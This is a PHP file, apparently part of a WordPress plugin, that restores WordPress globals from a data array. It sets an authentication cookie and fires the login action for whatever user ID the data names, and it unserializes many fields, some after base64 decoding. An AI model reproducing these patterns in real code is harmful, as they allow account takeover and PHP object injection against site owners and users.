<?php

// function dynamicShortcodeDecrypt($value){
//     return ($value);
// }

function ajaxds_initTheLoopGlobals($arrData)
{
    $postId = $arrData['wp_core_global_$post'];
    if ($postId !== null) {
        global $post;
        $post = get_post($arrData['wp_core_global_$post']);
        setup_postdata($post);
    }


    $userId = $arrData['wp_core_global_$user'];
    if (intval($userId) > 0) {
        $user = get_user_by('id', $arrData['wp_core_global_$user']);
        wp_set_auth_cookie($user->ID);
        do_action('wp_login', $user->user_login);
        setup_userdata($user->ID);
    }


    $GLOBALS['wp_the_query'] = unserialize($arrData['wp_core_global_$wp_query']);
    $GLOBALS['wp_query'] = $GLOBALS['wp_the_query'];

    $GLOBALS['posts'] = unserialize($arrData['wp_core_global_$posts']);

    $GLOBALS['authordata'] = get_user_by('id', unserialize($arrData['wp_core_global_$authordata'])->ID);

    global $currentday;
    $currentday = unserialize($arrData['wp_core_global_$currentday']);

    global $currentmonth;
    $currentmonth = unserialize($arrData['wp_core_global_$currentmonth']);

    global $page;
    $page = unserialize($arrData['wp_core_global_$page']);

    global $pages;
    $pages = unserialize($arrData['wp_core_global_$pages']);

    global $multipage;
    $multipage = unserialize($arrData['wp_core_global_$multipage']);

    global $more;
    $more = unserialize($arrData['wp_core_global_$more']);

    global $numpages;
    $numpages = unserialize($arrData['wp_core_global_$numpages']);
}


function ajaxds_initBrowserDetectionGlobals($arrData)
{
    global $is_iphone;
    $is_iphone = unserialize($arrData['wp_core_global_$is_iphone']);

    global $is_chrome;
    $is_chrome = unserialize($arrData['wp_core_global_$is_chrome']);

    global $is_safari;
    $is_safari = unserialize($arrData['wp_core_global_$is_safari']);

    global $is_NS4;
    $is_NS4 = unserialize($arrData['wp_core_global_$is_NS4']);

    global $is_opera;
    $is_opera = unserialize($arrData['wp_core_global_$is_opera']);

    global $is_macIE;
    $is_macIE = unserialize($arrData['wp_core_global_$is_macIE']);

    global $is_winIE;
    $is_winIE = unserialize($arrData['wp_core_global_$is_winIE']);

    global $is_gecko;
    $is_gecko = unserialize($arrData['wp_core_global_$is_gecko']);

    global $is_lynx;
    $is_lynx = unserialize($arrData['wp_core_global_$is_lynx']);

    global $is_IE;
    $is_IE = unserialize($arrData['wp_core_global_$is_IE']);

    global $is_edge;
    $is_edge = unserialize($arrData['wp_core_global_$is_edge']);
}


function ajaxds_initWebServerDetectionGlobals($arrData)
{
    global $is_apache;
    $is_apache = unserialize($arrData['wp_core_global_$is_apache']);

    global $is_IIS;
    $is_IIS = unserialize($arrData['wp_core_global_$is_IIS']);

    global $is_iis7;
    $is_iis7 = unserialize($arrData['wp_core_global_$is_iis7']);

    global $is_nginx;
    $is_nginx = unserialize($arrData['wp_core_global_$is_nginx']);
}


function ajaxds_initVersionGlobals($arrData)
{
    global $wp_version;
    $wp_version = unserialize($arrData['wp_core_global_$wp_version']);

    global $wp_db_version;
    $wp_db_version = unserialize($arrData['wp_core_global_$wp_db_version']);

    global $tinymce_version;
    $tinymce_version = unserialize($arrData['wp_core_global_$tinymce_version']);

    global $manifest_version;
    $manifest_version = unserialize($arrData['wp_core_global_$manifest_version']);

    global $required_php_version;
    $required_php_version = unserialize($arrData['wp_core_global_$required_php_version']);

    global $required_mysql_version;
    $required_mysql_version = unserialize($arrData['wp_core_global_$required_mysql_version']);
}


function ajaxds_initMiscGlobals($arrData)
{
    $GLOBALS['super_admins'] = unserialize($arrData['wp_core_global_$super_admins']);

    $GLOBALS['wp_rewrite'] = unserialize($arrData['wp_core_global_$wp_rewrite']);

    $GLOBALS['wp'] = unserialize($arrData['wp_core_global_$wp']);

    $GLOBALS['wp_locale'] = unserialize($arrData['wp_core_global_$wp_locale']);

    $GLOBALS['wp_admin_bar'] = unserialize($arrData['wp_core_global_$wp_admin_bar']);

    $GLOBALS['wp_roles'] = unserialize($arrData['wp_core_global_$wp_roles']);

    $GLOBALS['wp_meta_boxes'] = unserialize($arrData['wp_core_global_$wp_meta_boxes']);

    $GLOBALS['wp_registered_sidebars'] = unserialize($arrData['wp_core_global_$wp_registered_sidebars']);

    global $wp_registered_widgets;
    $wp_registered_widgets = unserialize($arrData['wp_core_global_$wp_registered_widgets']);

    global $wp_registered_widget_controls;
    $wp_registered_widget_controls = unserialize(ajaxds_safeDecodeBase64($arrData['wp_core_global_$wp_registered_widget_controls']));

    global $wp_registered_widget_updates;
    $wp_registered_widget_updates = unserialize(ajaxds_safeDecodeBase64($arrData['wp_core_global_$wp_registered_widget_updates']));
}


function ajaxds_initAdminGlobals($arrData)
{
    global $pagenow;
    $pagenow = unserialize($arrData['wp_core_global_$pagenow']);

    global $post_type;
    $post_type = unserialize($arrData['wp_core_global_$post_type']);

    global $allowedposttags;
    $allowedposttags = unserialize($arrData['wp_core_global_$allowedposttags']);

    global $allowedtags;
    $allowedtags = unserialize($arrData['wp_core_global_$allowedtags']);

    global $menu;
    $menu = unserialize($arrData['wp_core_global_$menu']);
}
